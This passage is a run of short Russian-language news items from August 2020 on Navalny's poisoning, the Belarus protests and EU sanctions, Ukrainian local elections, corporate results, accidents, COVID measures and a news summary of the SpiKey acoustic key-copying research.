По словам главного конструктора концерна Сергея Уржумцева, оружие разрабатывалось в двух калибрах — 5,45 и 9 мм. Вес "Малыша" примерно на кило меньше общевойскового автомата.
 
Источники

В Москве около здания ФСБ на Лубянке задержали члена Либертарианской партии России Кирилла Чуракова, который стоял с плакатом «Навального отравили. Он в коме». Об этом ОВД-Инфо сообщил сам Чураков. Активиста доставили в отдел полиции по Мещанскому району.
На Чуракова составляют протокол о нарушении режима повышенной готовности в период распространения коронавируса (ст. 20.6.1 КоАП).
Алексею Навальному, который рано утром возвращался из Томска в Москву в самолете стало плохо. Самолет, в котором он летел, экстренно посадили в Омске. Политика госпитализировали с симптомами токсического отравления. Он находится в коме на тяжелом состоянии.
 
Источники

В paмкaх визита пpезидентa Зеленского в Хеpсон билa пpедстaвленa комaндa от пapтии «Слугa нapодa» к местным выборам.
Об этом сообщает местное издание kherson.net.ua, передает RegioNews.
По данным издания, во время презентации команды выступил ректор Херсонского государственного аграрного университета Юpий Киpилов, который пpетендует нa кpесло меpa от «Слуги народа».
Он поблагодарил президента Зеленского и партию «Слуга народа» за поддержку.
В своей речи Киpилов заявил, что готов «строить новый Хеpсон с новым отношением местных властей к людям», а также пообещал, что сделает Хеpсон «комфоpтним для всех жителей города».
Юрий Кириллов был избран депутатом Херсонского городского совета в ноябре 2015 года от партии Блока Петра Порошенко. В марте 2017 года он стал ректором Херсонского государственного аграрного университета.
Во время парламентских выборов 2019 года Кириллов неудачно баллотировался по 183 округу от партии «Европейская Солидарность».
Напомним, в Херсоне наивысшие рейтинги перед выборами у бывшего мэра Владимира Сальдо – соцопрос.
 
Источники

Проект частичного демонтажа и перестройки Дома Советов покажут на следующей неделе. Об этом сообщает пресс-служба правительства Калининградской области в четверг, 20 августа.
Питерский офис одной из консалтинговых компаний подготовил проект. На следующей неделе они вместе с инвестором — калининградской компанией, которая гипотетически будет развивать территорию возле Дома Советов — презентуют проект", — подчеркнули в пресс-службе.
Накануне глава региона Антон Алиханов сообщил, что некоторые элементы Дома Советов восстановить невозможно, их необходимо будет перестроить.
 
Источники

Если рядом с оккупированным Крымом будет успешная Херсонщина, то его возвращение произойдет гораздо быстрее.
Об этом сказал во время своего выступления в Херсоне президент Владимир Зеленский, передает RegioNews со ссылкой на УНН.
 
Ранее Зеленский представил кандидата на пост мэра Херсона, им стал Юрий Кириллов.
 
Источники

Глава правления Гражданской сети ОПОРА Ольга Айвазовская заявила, что в партийных списках кандидатов для территориальных избирательных комиссий перед местными выборами 25 октября уже обнаружено около 160 человек, которые умерли.
Как передает RegioNews, об этом сообщает УНН.
Айвазовская отметила, что по информации, которая сейчас имеется, есть проблема использования персональных данных граждан без их согласия для того, чтобы быть зарегистрированными, поданными.
"Решение по отдельным людям принято членами территориальных избирательных комиссий. Потому что у нас есть упрощение в процедуре подачи - а именно отсутствие заявления со стороны лица на готовность работать в избирательной комиссии. Эти заявления должны были бы быть, но они хранятся в политической партии, они не предоставляються к пакету документов для ЦИК", - сказала она.
По ее словам, уже известны факты, когда политические партии вносят в перечень кандидатов в члены ТИК фамилии людей, которые уже умерли. Она добавила, что ЦИК имеет доступ к реестру избирателей и может проверять такую информацию.
 
Ранее сообщалось, что образование новых районов и ликвидация тех, что существуют, обеспечит соответствие системы административно-территориального устройства районного уровня Украины современным требованиям и европейским стандартам.
 
Источники

МИД Литвы внес президента Беларуси Александра Лукашенко и еще 31 одно должностное лицо в «черный список», сообщают СМИ в четверг, 20 августа, СМИ. Предлагается, что всем им будет запрещен въезд в страну.
Накануне лидеры стран Евросоюза на экстренном саммите приняли решение не признать итоги президентских выборов в Беларуси, а также выразили поддержку протестующим против их фальсификации. Кроме того в ЕС в скором времени собираются ввести санкции против белорусских чиновников, ответственных за насилие, репрессии и манипуляции, приведшие к искажению результатов волеизъявления граждан.
Евросоюз решил выделить 53 миллиона евро для помощи белорусскому народу. Деньги пойдут на развитие гражданского общества, борьбу с коронавирусом и поддержку пострадавших от репрессий со стороны белорусских властей. В Москве решение Евросоюза устами пресс-секретаря президента РФ Дмитрия Пескова и министра внутренних дел Сергея Лаврова назвали вмешательством во внутренние дела Беларуси. Лавров также заявил, что протестующие сами спровоцировали милицию на применение силы.
Напомним, за несколько дней в поствыборный период, только по официальным данным, в республике было задержано свыше семи тысяч человек, многих из них подвергли жестокому избиению и унижению. В результате действий силовиков по разгону уличных акций пострадало несколько сотен человек, трое убито.
«Для Лукашенко важнее, что Москва от него сейчас не дистанцируется»
Директор Института социологического анализа, вице-президент фонда «Либеральная миссия» Игорь Клямкин в интервью Русской службе «Голоса Америки» сказал, что само по себе решение Евросоюза никакой угрозы для Лукашенко не представляет. По его словам, он и раньше не был принимаем европейцами, так что ничего в этом плане не поменялось.
«Для него важнее, что Москва от него сейчас не дистанцируется, а официальные лица не критикуют публично Минск,– добавил он. – Мало того, (Сергей) Лавров даже выступил с оправданием действий белорусских силовиков, заявив, что их якобы провоцировали протестующие. Да и все (телефонные) разговоры Лукашенко с Путиным свидетельствуют о том, что белорусский президент отступать не собирается, исходя из того, что российский лидер на этом этапе пообещал ему поддержку, не имея альтернативы и не желая допустить, чтобы в одной из частей Союзного государства власть сменилась под давлением народного недовольства».
Тем более, что Лукашенко сохраняет контроль над государственной машиной, уточнил Игорь Клямкин: «Сложилась такая ситуация, когда большая часть страны настроена против него, требует его ухода, а вся военно-бюрократическая полицейская машина его поддерживает, и практически никаких примет, свидетельствующих, что она под влиянием протестов рассыпается, не наблюдается. В такой обстановке Лукашенко рассчитывает, что ему удастся сохранить свою власть на какой-то период».
В последние дни он явно почувствовал себя увереннее и переходит в словесное наступление, считает директор Института социологического анализа. Как ему представляется, режим держится на порочных связях и пока способен удерживать статус-кво.
«Для Лукашенко это плохо, однако не критично»
В свою очередь, директор Центра восточноевропейских исследований, Андрей Окара заметил, что Европа довольно поздно отреагировала на события в Беларуси поздно, но ожидаемо. По его оценке, для Лукашенко это плохо, однако не критично.
«Такой Лукашенко сейчас выгоден для Москвы, – утверждает он в комментарии «Голосу Америки». – Посмотрим, насколько далеко он может зайти в плане развития отношений с Россией. Его режим перестал быть легитимным не после заявления Евросоюза, а гораздо раньше. Это произошло после в целом нелегитимной выборной (президентской) кампании, в ходе которой пересажали или выгнали из страны всех основных конкурентов Лукашенко, и после того как Беларусь превратилась в гестапо, где калечили и даже убивали людей».
Так что европейское непризнание для действующего главы белорусского государства болезненно, но не является определяющим и не решает его политическую судьбу, констатировал Андрей Окара. По его мнению, на более тесные отношения с Москвой он может пойти при любом раскладе.
«Тем не менее, по моим прикидкам, режим Лукашенко продержится от недели до двух месяцев, – спрогнозировал он. – Его падению должны способствовать консолидированные действия гражданского общества Беларуси, забастовки – очень действенный инструмент, эффективная работа коалиционного совета оппозиции и общий консенсус внутри европейских элит и всемирная солидарность с белорусским народом».
По сообщениям СМИ, координационный совет оппозиции Беларуси готов к контактам с Россией, согласно заявлению члена президиума организации, экс-министра культуры Павла Латушко.
На развитие ситуации также могут повлиять и другие факторы, подчеркнул Андрей Окара. Если, например, события в результате какой-либо провокации, чего совершенно нельзя исключить, перейдут в активную вооруженную фазу противостояния, а за этим еще и последует военная помощь из России, заключил политолог.
«Можно выразить “глубокую озабоченность”, но решать все равно будут сами белорусы»
20 августа исполняется 42 года с начала так называемой операции «Дунай», когда в Чехословакию вторглись войска пяти стран Варшавского договора для подавления «Пражской весны». Некоторые комментаторы вспоминают об этой годовщине, проводя исторические параллели с недавним обращение Александра Лукашенко к Владимиру Путину, где говорится о том, что события в Беларуси могут распространиться и на Россию, а затем на другие страны СНГ.
Обозреватель газеты «Hospodářské noviny» Ондржей Соукуп (Ondrej Soukup) считает, что уместнее сравнивать происходящее в Беларуси с событиями в ноября 1989 года, когда в Чехословакии произошла «бархатная революция». «У меня эта ассоциация возникла, когда я смотрел выступление Лукашенко на Минском заводе колесных тягачей. Рабочие стали кричать ему “Уходи!”, и я вспомнил, как у нас во время “Бархатной революции” шеф пражского отделения КПЧ решил обратиться за поддержкой к рабочим завода ČKD со словами, мол, конечно, в стране нужно кое-что менять, но никогда 15-летние дети не могут приказывать президенту уходить в отставку. И тогда собравшиеся несколько тысяч рабочих начали скандировать “Мы не дети!”.
И для нас это было сигналом, что король – голый! Если рабочий класс, который по идеологии должен быть стержнем коммунистического правительства, выступает против них, значит, уровень недоверия к власти настолько высок, что, как говорится – их песенка спета», – рассказал чешский эксперт в беседе с корреспондентом Русской службы «Голоса Америки».
Замечание Александра Лукашенко о «чешских кукловодах», которые, якобы, стоят за протестным движением в Беларуси, Ондржей Соукуп воспринимает с юмором. «Это трудно комментировать с содержательной точки зрения, – разводит он руками. – Но можно даже сказать, что Чехии это может быть даже лестно – вот мы какие всесильные! Но если говорить серьезно, то, конечно, в Чехии есть белорусская диаспора, и ее представители проводили акции солидарности с протестующими на своей родине. Они вывешивали исторические флаги Беларуси на домах в Праге и в других городах, и даже ко мне обращались несколько человек с вопросом, где можно достать бело-красно-белый флаг? Ну, и премьер-министр Андрей Бабиш выступил с достаточно резким осуждением действий белорусских властей. Но Чехия хорошо понимает свой политический вес, и премьер-министр говорил, что мы не будем вводить собственные санкции, и что нужно договориться о совместных действиях в рамках Евросоюза. Но, конечно, ни Чехия, ни Евросоюз не могут переломить ситуацию. Можно выразить “глубокую озабоченность”, но решать (судьбу своей страны) все равно будут сами белорусы», – убежден собеседник «Голоса Америки».
Что же до реакции Европейского Союза, то, как напоминает Ондржей Соукуп, и санкции против белорусских властей, и символические жесты, вроде «глубокой озабоченности» со стороны Брюсселя продолжаются с некоторыми перерывами с 1996 года, когда Лукашенко изменил конституцию своей страны и разогнал парламент. «И мне не кажется, что то, о чем они (страны ЕС) договорились сейчас, может иметь какое-то решающее значение. Может быть, введение персональных санкций заставит задуматься какую-то часть элит, что они больше не смогут ездить в Литву за покупками, но и только. И выделение денежной помощи – на медицину, на поддержку независимых СМИ и на помощь пострадавшим – по сравнению с ресурсами белорусского государства, и особенно, если Россия тоже вступит в эту игру, то это абсолютно мизерные суммы», – заключает обозреватель газеты «Hospodářské noviny»
«Чтобы режим реально испугался, нужны серьезные экономические санкции»
Корреспондент газеты «Lietuvos Rytas» Витаутас Бруверис (Vytautas Bruveris) в целом, согласен с позицией своего чешского коллеги. По мнению Брувериса, заявление Евросоюза не будут иметь решающего значения ни в Беларуси, ни во всем регионе. «Это понимают и в Литве, и в самом Евросоюзе, где в значительной степени имитируют бурную деятельность. Всем понятно, что “поезд уехал” и уже давно», – сказал он в беседе с корреспондентом Русской службы «Голоса Америки».
По мнению Брувериса, ни у Евросоюза, ни у Соединенных Штатов нет ясной, комплексной, четко артикулированной политики по отношению как к Беларуси, так и к России. «Было такое заигрывание с диктатурами при помощи кнута и пряника. Даже непонятно, кто с кем больше заигрывал. Мне кажется, что в большей мере как раз Лукашенко заигрывал с Западом», – считает Витаутас Бруверис.
И продолжает: «Теперь, когда диктатура деградировала окончательно, уже нельзя не замечать, что там исчезают люди, что криминальная диктатура основана на крови и убийствах, и надо принимать какие-то меры. Но меры принимаются без четкого плана действий. Хотя, возможно их и быть не может, потому что ситуация непрогнозируемая, нестабильная и неуправляемая. Она движется к какой-то силовой кульминации», – опасается литовский журналист.
Что же касается итогов голосования 9 августа, то, по мнению Брувериса, все прекрасно понимают, что никаких честных выборов в Беларуси давно не было, и Александр Лукашенко является нелегитимным президентом. Однако, это, практически ничего не значит: «Ну, он будет невъездным, с ним никто не будет общаться и что дальше? Ничего! Россия, которая для Лукашенко является более важной страной, будет с ним поддерживать отношения.
И если уже говорить о политике санкций, то, чтобы режим что-то почувствовал, реально испугался и начал бы пятиться, нужны серьезные экономические санкции, чтобы они ударили по экономике, по главным предприятиям, по главному «кровотоку» самой диктатуры – грязным, черным деньгам, которые разворованы внутри страны и отмыты на Западе», – подчеркивает Корреспондент газеты «Lietuvos Rytas» .
И завершает свой комментарий для «Голоса Америки» так: «Диктатура ни с кем, ни о чем не будет договариваться, честных выборов она не допустит. Так что все упирается в ситуацию внутри страны. Потому что и Россия не имеет хороших ходов – падение режима Лукашенко ей невыгодно, так же, как и прямая интервенция и оккупация Беларуси. Все упирается в протест, в эту часть общества. Это – тот главный фактор, который может поменять ситуацию по существу».
 
Источники

Выручка "Металлоинвеста" в 1 полугодии 2020 года по МСФО снизилась на 14,2% по сравнению с аналогичным периодом 2019 года и составила $3 075 млн, сообщила компания.
EBITDA в 1 полугодии сократилась на 24,9% и составила $1 059 млн, рентабельность EBITDA составила 36,5% против 41,6% в 1 полугодии 2019 года.
Чистая прибыль "Металлоинвеста" снизилась на 48% и составила $530 млн.
Чистый долг составил $3 409 млн (-9,2% по сравнению с 31 декабря 2019 года). Чистый долг / EBITDA LTM составил 1,6x против 1,5x на 31 декабря 2019 года.
Капитальные затраты снизились на 5,4%, до $209 млн.
 
Источники

Водитель автобуса с рабочими, который перевернулся под Правдинском отвлёкся и наехал на дерево. Об этом сообщает пресс-служба регионального УМВД. Полиция также опубликовала видео с места происшествия.
Ехал километров 50-60 (в час, — ред.), может. Я вижу, что у меня что-то вправо, я встал и оно, видать, качнуло. Я смутно помню. Потом влево и второй раз и остановился. Люди пострадали. Я выбежал, ехали машины встречные. Скорые подъехали, я вызывал 112", — рассказал водитель.
По предварительным данным, в транспорте находилось 15 пассажиров, четверо из них  обратились за медицинской помощью. Проводится проверка, устанавливаются все обстоятельства происшествия, уточняется информация о других возможных пострадавших.
Авария произошла утром в четверг, 20 августа в 7:10 на трассе Домново — Ягодное. Ранее сообщалось, что у автобуса на ходу лопнуло колесо.
 
Источники

Команда специалистов из Национального университета Сингапура смогла создать на 3D-принтере рабочую копию физического ключа с помощью анализа звуков, издаваемых при его попадании в замок. Программное обеспечение для обработки сигналов позволяет путем расшифровки слышимых металлических щелчков определить точную форму последовательности выступов на стержне ключа.
Атака, получившая название SpiKey, работает с так называемыми штифтовыми замками типа Yale/Schlage, которые открываются с помощью ключа с уникальным ребристым рисунком на одной из граней. Внутри подобных замков расположены шесть металлических штифтов, прикрепленных к пружинам, которые выдвигаются на разную высоту за счет выступов на ключе или удерживаются на низком уровне пустотами между выступами. Как только все подпружиненные штифты приподнимаются на нужную высоту с помощью ключа, он поворачивается, и замок открывается. В то время как шестипиновый замок имеет примерно 330 тыс. возможных форм ключей, атака SpiKey может сузить их до трех искомых.
Для взлома такого типа замков обычно требуются специальные инструменты, чтобы вручную регулировать высоту каждого штифта. В рамках метода сквозной атаки SpiKey, разработанного экспертами, злоумышленник может записать звук поворачиваемого ключа на свой смартфон и путем обработки аудиозаписи в ПО SpiKey вычислить расстояния между гребнями ключа и то, что слесари называют «глубиной надреза» этих гребней.
По словам исследовательницы киберфизических систем Саундарьи Рамеши, обычные грабители вряд ли смогут осуществить подобную атаку в реальной жизни. Как показали результаты экспериментов, микрофон необходимо удерживать на расстоянии всего 10 сантиметров возле источника звука, а аудиозапись должна производиться практически в идеальной тишине, без посторонних звуков и шумов.
 
Источники

Кино о ребёнке-инвалиде, который благодаря силе духа и помощи отца смог стать чемпионом мира по боям без правил, снимут в Калининграде. Об этом "Клопс" рассказал сценарист и режиссёр проекта Януш Таран.
Кино называется "Железное сердце". Я сейчас дописываю сценарий. Оно о том, как маленький спортсмен попал в автомобильную аварию, получил травму и стал инвалидом. Врачи сказали, что он больше никогда в жизни не сможет заниматься спортом, так как при малейшей нагрузке может умереть. Но внутренняя сила и его отец помогли ему не сдаться. Став взрослым, мальчик достигает своей цели и становится чемпионом мира по боям без правил», — описал сюжет Таран.
Януш Таран — финалист всероссийского конкурса Estel Video Award 2019, он снимал ролики для РЖД и сериалы для компании Good Story Media. К проекту режиссёр и команда готовятся уже четыре месяца.
В съёмках задействуют спорткомлекс "Юность", стадион "Трудовые резервы", кардиоцентр, побережье Куршской косы. Фильм планируют запустить в прокат в Калининградской области и, возможно, в других регионах России.
Проект некоммерческий. Мы снимаем кино, потому что хотим развивать и популяризировать спорт в нашей области. Хотим, чтобы каждый человек поверил, что может добиться победы. Когда тебя поддерживают и по-настоящему верят, нет ничего невозможного», — добавил режиссёр.
Сейчас на роли ищут актёров — девочек и мальчиков от восьми до 11 лет, также нужны спортсмены смешанных единоборств от 25 до 40 лет и артисты массовых сцен любого возраста. Кастинг обещали объявить в ближайшие дни.
В команду набирают реквизиторов, постановщиков, скрипт-супервайзеров, помощника режиссёра и костюмера. Съёмки планируют начать в декабре, для участия в них нужно написать в группу .
 
Источники

Власти Грузии решили активизировать тестирование на коронавирус в туристических зонах. Об этом сообщил глава Национального центра по контролю заболеваний и общественного здоровья Грузии (NCDC) Амиран Гамкрелидзе.
По его словам, целевое тестирование затронет сотрудников гостиниц, кафе-баров и клубов. Решение принято после выявления коронавируса у сотрудников кафе-бара «Гавана» в Кобулети, пишет «Эхо Кавказа».
Гамкрелидзе также отметил, что планируется установка двух палаток на батумском бульваре, где граждане смогут добровольно пройти тест на коронавирус.
Число случаев коронавируса в Грузии достигло 1370, выздоровели 1108 человек, 17 - умерли.
 
Источники

Антимонопольный комитет возбудил дело по признакам сговора на тендерах при строительстве Подольско-Воскресенского моста в Киеве.
Об этом в Facebook сообщил председатель отделения АМКУ Алексей Хмельницкий, передает RegioNews.
По данным ведомства, нарушения зафиксированы на общую сумму около 100 млн грн.
В частности, АМКУ насторожили тендеры, проведенные коммунальным предприятием «Дирекция строительства дорожно-транспортных сооружений г. Киева» с участием двух других фирм, в частности строительной компании «Укрбуд».
Было зафиксировано снижение участниками торгов ценовых предложений, совместное использовании IP-адресов для управления счетами, подачу документов на тендеры с одного IP-адреса и совместное использовании IP-адресов для отчетности в органы ГНС.
По данным АМКУ, это типичный набор действий, которые могут свидетельствовать о сговоре при проведении тендеров.
 
Напомним, ранее СБУ разоблачила многомиллионные злоупотребления при строительстве в зоне отчуждения. Коммерческие структуры «Укрбуда» оштрафовали на 117 миллионов гривен.
 
Источники

Сегодня, 20 августа, Сумской окружной админсуд принял решение по делу о восстановлении на работе Глуховского городского головы Мишеля Терещенко.
Об этом пишет RegioNews со ссылкой на Sumy Today.
Терещенко обратился с иском к исполкому и Глуховскому горсовету о признании противоправным и отмене решения, которым были прекращены его полномочия городского головы в марте этого года, и восстановлении в должности. Как отметил сам мэр, основанием для такого голосования тогда стало его заявление о прекращении полномочий, которую он отозвал еще в октябре 2018 года. Представитель ответчика с этим согласился.
В начале заседания он подал ходатайство о прекращении производства по делу. Основанием для этого стало решение Глуховской горсовета, принятом на сессии 6 августа, которым отменяется мартовское решение об увольнении Терещенко с должности городского головы и его восстановления.
Как известно, на сессии 6 августа вторым вопросом рассмотрели досрочное прекращение полномочий Мишеля Терещенко. И большинством голосов тайного голосования его "уволили" второй раз уже по другим основаниям. А именно, из-за отсутствия на рабочем месте за 2019-2020 годы по неустановленным причинам 242 рабочих дня и нарушения Конституции Украины, законов, прав и свобод граждан.
Суд в удовлетворении такого ходатайства отказал и постановил возобновить мэра Глухова Мишеля Терещенко на посту.
Напомним, мэр Конотопа под посольством РФ сожгли российский флаг
 
Источники

В связи с ухудшением ситуации по распространению коронавирусной инфекции на территории области, харьковская полиция вместе с облгосадминистрацией, городскими властями, Госпродпотребслужбой, ГСЧС, службами Министерства здравоохранения активизирует проверки.
Об этом сообщили в пресс-службе полиции Харьковской области, передает RegioNews.
Так, за прошедшие сутки в регионе зафиксировали антирекорд по количеству новых случаев коронавируса - заболели 242 человека.
 
За нарушение правил карантина и санитарных норм законом предусмотрена как административная, так и уголовная ответственность. Это штрафы от 17 до 170 000 гривен или тюремное заключение сроком от 3 до 8 лет.
Ранее сообщалось, что 19 августа заразились коронавирусом 2 134 человек, умерли 40 пациентов, были госпитализированы 407 человек.
Читайте также: Коронавирус в Украине: хроника (обновляется)
 
Источники

Правительство России в 2020 году выделило из резервного фонда 1,25 трлн рублей на&nbsp;предотвращение негативного влияния на развитие отраслей экономики и устранение последствий, вызванных распространением Covid-19. Об этом говорится в оперативном докладе Счетной палаты&nbsp;об исполнении федерального бюджета за январь-июнь 2020 года.
"Из резервного фонда правительства Российской Федерации в соответствии со сводной росписью выделено 1 419,7&nbsp;млрд рублей, из которых 1 248,1&nbsp;млрд рублей направлены на решение вопросов финансового обеспечения мероприятий по предотвращению влияния ухудшения экономической ситуации на развитие отраслей экономики, на профилактику и устранение последствий распространения коронавирусной инфекции", - говорится в докладе.
Счетная палата также отмечает, что по отдельным решениям правительства о выделении средств из резервного фонда, принятым в марте — апреле 2020&nbsp;года, исполнение расходов не осуществлялось, либо осуществлено на крайне низком уровне (от 0,004% до 17,2%).
Структура средств резервного фонда Правительства, использованных в I полугодии 2020 г.
 
Источники

В Госдуме предложили увеличить штрафы для владельцев шумных мотоциклов, идёт работа над соответствующим законопроектом. Об этом пишет "РИА Новости" в четверг, 20 августа.
Изменения предлагается внести в КоАП. По действующей норме (ст. 8.23) за использование транспортных средств, уровень шума которых превышает норму, можно получить предупреждение или штраф в 500 рублей. По словам зампреда комитета нижней палаты парламента по экологии и охране окружающей среды Михаила Старшинова, этим меры неэффективны, а шумные мотоциклисты создают дискомфорт для других людей.
Один мотоциклист ранним утром по улице проехал, а проснулась тысяча жильцов. Разве это нормально? Купил гражданин себе Harley-Davidson за 30 тысяч долларов — он может себе позволить заплатить 300 рублей штрафа, он их и не чувствует. Вот зато мотоцикл у него такой звук издаёт, на него все люди обернулись, он таким образом своё самолюбие потешил. Ощутимо, когда ему инспектор выписал штраф, условно говоря, не 500 рублей, а пять тысяч. То есть штраф должен быть адекватен той цели, которую он преследует", — заявил Старшинов.
По словам парламентария, озвученные суммы условны и ещё обсуждаются с экспертами.  Старшинов подчеркнул, что авторы законопроекта — не сторонники "закручивания гаек".
Мы же не преследуем цель собрать с граждан деньги и пополнить таким образом казну. Это, если угодно, профилактическая мера, которая будет стимулировать водителей, чтобы они этих правил не нарушали — это самое главное. Поэтому цифра будет адекватная для того, чтобы поставленная задача была выполнена", — заключил парламентарий.
В 2017 году ГИБДД поддержали идею ограничить езду мотоциклистов в спальных районах Калининграда.
 
Источники

Генеральный прокурор Беларуси Александр Конюк заявил, что возбуждено уголовное дело против Координационного совета по статье 361 Уголовного кодекса Беларуси «Призывы к действиям, направленным на причинение вреда национальной безопасности Республики Беларусь».
Sputnik пишет, что Конюк рассказал журналистам:
 
По этой статье максимальный срок лишения свободы — 5 лет.
Александр Лукашенко раньше утверждал, что Координационный совет это попытка захвата власти и заявил, что будет принимать «адекватные меры».
Инициировала создание координационного совета для передачи власти в стране 14 августа Светлана Тихановская, находящаяся сейчас в Литве. Она сообщила в своём обращении, что цель совета это выход на диалог с нынешним правительством и трансфер власти.
В совет вошли: Светлана Алексиевич, Сергей Чалый, Мария Колесникова, Андрей Курейчик, Евгений Ливянт, Юлия Чернявская, Владимир Цеслер, уволенный недавно экс-директор Купаловского театра Павел Латушко, представитель стачсовета Минского тракторного завода Сергей Дылевский и другие.
Ольга Ковалькова, представитель Тихановской, уточнила, что у совета нет цели захвата власти неконституционным путём.
 
 
Источники
* 
*

В Санкт-Петербурге Росгвардия задержала участника «Альянса врачей» Алексея Абзианидзе, который пришел в прокуратуру для ознакомления с документами по своей жалобе. Об этом ОВД-Инфо сообщил его знакомый Эдуард Шитик.
Абзианидзе задержали в здании прокуратуры Центрального района Санкт-Петербурга под предлогом того, что он находился без маски. Шитик сообщает, что Абзианидзе был в маске.
Абзианидзе проводит расследования по фальсификациям в области медицины, в связи с чем приехал в прокуратуру Центрального района для ознакомления с документами по своему заявлению.
Новость обновляется
 
Источники

Уголовное дело, в рамках которого обвинения предъявлены экс-министру финансов, бывшему главе Комитета по госдоходам Армении Гагику Хачатряну, передано в суд. Об этом сообщает пресс-служба Генпрокуратуры РА.
Отмечается, что Хачатрян обвиняется в присвоении, растрате в особо крупных размерах и ее организации, пособничестве в отмывании денег в особо крупных размерах, злоупотреблении служебным положением, получении взятки в особо крупных размерах и фальсификации официальных документов.
Сумма ущерба, причиненного государству, составляет около 20 млрд драмов (около $41 млн.)
Обвинения в присвоении или растрате, а также служебном подлоге предъявлены и бывшему высокопоставленному чиновнику КГД Карену Хачатряну.
На имущество подозреваемых наложен арест.
Гагик Хачатрян занимал пост министра финансов в 2014–2016 годах, до этого он был председателем Комитета по госдоходам. Хачатрян был арестован 30 августа 2019 года.
 
Источники

Впервые с 2013 года Армения не примет участие в международных соревнованиях «Танковый биатлон». Об этом становится известно из онлайн-площадки конкурса.
Пресс-секретарь Минобороны РА Шушан Степанян в беседе с PanARMENIAN.Net заявила, что участие Армении в танковом биатлоне в 2020 году нецелесообразно.
«Мы тщательно изучим существенные изменения характеристик, которые произошли в соревнованиях, и в следующем году мы примем участие в биатлонах сразу нескольких средств передвижения», - отметила Степанян.
Соревнования проходят в рамках турнира «Армейские международные игры».
Армения участвует в ежегодном биатлоне с 2013 года. В 2014 году страна заняла 2 место и выиграла танк Т90-С. Танк был перевезен в Армению в 2016 году.
 
Источники

Бизнесмен и лидер политсилы «Победа Пальчевского» Андрей Пальчевский создал партию, потому что знает, как сделать жизнь украинцев лучше.
Как сообщает RegioNews, об этом он заявил в интервью « РБК-Україна».
 
Кроме того, бизнесмен объяснил, почему решил пожить в разных районах Киева.
 
Ранее сообщалось, что «Євросолидарность» опережает «Слугу народа» на местных выборах в Киеве.
 
Источники

В работе основных сервисов Google, включая Gmail, Drive, Docs, Meet, Groups, Chat, Keep и Voice, произошел глобальный сбой. О проблемах в работе сервисов пользователи по всему миру начали сообщать после 7:00 утра.
Загрузка файлов в сервисы Google не выполнялась должным образом, включая загрузку вложений в электронных письмах Gmail. В некоторых случаях пользователи не могли даже просто написать новое электронное письмо или ответить на входящее.
Как сообщила компания Google, возникшие проблемы были связаны с отправкой писем через Gmail, видеотелефонной связью в Meet, созданием файлов в сервисе Google Диск, загрузкой CSV-файлов в консоли администратора, отправкой сообщений в Google Chat, добавлением новых страниц на сайтах, а также с сервисами Keep и Voice.
В то же время в пользователи Twitter пользователи массово жалуются на проблемы с загрузкой роликов в YouTube.
Что стало причиной сбоя пока неизвестно. Команда разработчиков подтвердила, что активно работают над установлением причины неполадок и их устранением.
 
Источники

Группа "М.Видео-Эльдорадо" перенесла разработку и эксплуатацию продуктов дата-офиса&nbsp;на платформу Яндекс.Облако. Это позволило ритейлеру в три раза увеличить объем ресурсов для ML-разработки, что дает возможность одновременно проводить порядка ста пилотов и экспериментов, говорится в сообщении "М.Видео"."За два года с открытия&nbsp;Data Science&nbsp;центра мы значительно расширили область своей компетенции, штат сотрудников и объемы разработки выросли в несколько раз. Сейчас дата-офис "М.Видео-Эльдорадо" на постоянной основе разрабатывает и выводит в продуктив целый ряд решений для автоматизации и повышения эффективности бизнеса во многих направлениях: коммуникации с клиентами, формирование персонализированных предложений, работа с ассортиментом и промо-планом. Такой рост требует гибкого подхода к мощностям. Облачные технологии позволяют нам масштабировать инфраструктуру буквально в течение часа и также быстро свернуть, когда она не используется, оптимальным образом используя финансовые ресурсы без масштабных инвестиций в закупку и поддержку собственного оборудования", &ndash; отметил&nbsp;директор дата-офиса "М.Видео-Эльдорадо" Кирилл Иванов.
Компания начала активно использовать графические ускорители (GPU) и перешла на модель потребления вычислительных мощностей в объеме, необходимом только для решения конкретной задачи. Для оперативной обработки данных дата-офис ритейлера с помощью сервиса Yandex Cloud Interconnect соединён с дата-центром Яндекс.Облака.&nbsp;Построение собственного ЦОДа для задач дата-офиса "М.Видео-Эльдорадо" привело бы к существенному увеличению сроков проекта и капитальных затрат, говорится в сообщении ритейлера.
 
Источники

Координатору штаба Навального в Кургане Алексею Шварцу вручили три повестки в военкомат после допроса в Следственном комитете. Об этом сообщает издание «Урал. МБХ медиа».
Шварца вызвали в СК на допрос в рамках доследственной проверки по уголовному делу об уклонении от прохождения военной службы (ст. 328 УК). После допроса ему вручили три повестки в военкомат.
«Первая повестка касается уточнения документов для воинского учета, затем меня вызывают на заседание призывной комиссии, а также для прохождения медкомиссии. На этот раз повестки оказались не просроченными. Я сказал, что не скрываюсь от воинской службы. Сейчас планирую направить запрос в СК, чтобы выяснить, возбуждено ли против меня уголовное дело об уклонении от службы», — передает издание слова Шварца.
Ранее координатору курганского штаба Навального угрожали возбуждением уголовного дела по статье об уклонении от службы в армии и пытались вручить просроченную повестку в военкомат.
13 мая сотрудника омского регионального штаба Навального Евгения Рудковского вызывали в военную прокуратуру из-за сомнений в том, что он не годен к службе.
23 декабря менеджера проектов ФБК Руслана Шаведдинова задержали в его собственной квартире. В тот же день Мосгорсуд признал законным решение призывной комисии о его годности к службе. Днем позже стало известно, что Шаведдинов находится в воинской части на Новой Земле.
Сотрудники и волонтеры штабов оппозиционера Алексея Навального регулярно сталкиваются с различными формами политически мотивированного давления со стороны государства. Так, в рамках уголовного дела об отмывании денег в ФБК, проходили обыски у сотрудников штабов по всей стране.
 
Источники

С начала года в Украине на политическую рекламу в Facebook было потрачено 1,1 миллиона долларов.
Об этом говорится в исследовании движения " Честно", передает RegioNews.
Лидером по затратам стал пятый президент Петр Порошенко, он потратил на рекламу в Facebook 52,8 тысячи долларов.
Второе место занимает программа "Шустер LIVE", она потратила 39,4 тысячи долларов. Страница рекламирует гостей эфира или ведущего Савика Шустера.
На третьем месте по затратам с суммой более 20 тысяч долларов - нардеп от "Слуги народа" Николай Тищенко.
Далее по расходам идут "Партии Шария", страница "Городок", которая пиарит партию мэров, Facebook бывшего премьера Владимира Гройсмана, ресурс "Обозреватель", руководитель киевской ячейки "Батькивщины" Виталий Нестор и нардеп Антон Яценко.
Среди политических партий больше всего на рекламу в Facebook потратили 5 партийных страниц Украинской галицкой партии - 23,1 тысячи долларов.
20 тысяч долларов потратили 4 страницы "Партии Шария", на третьем месте - 27 страниц, связанных с партией "Европейская солидарность".
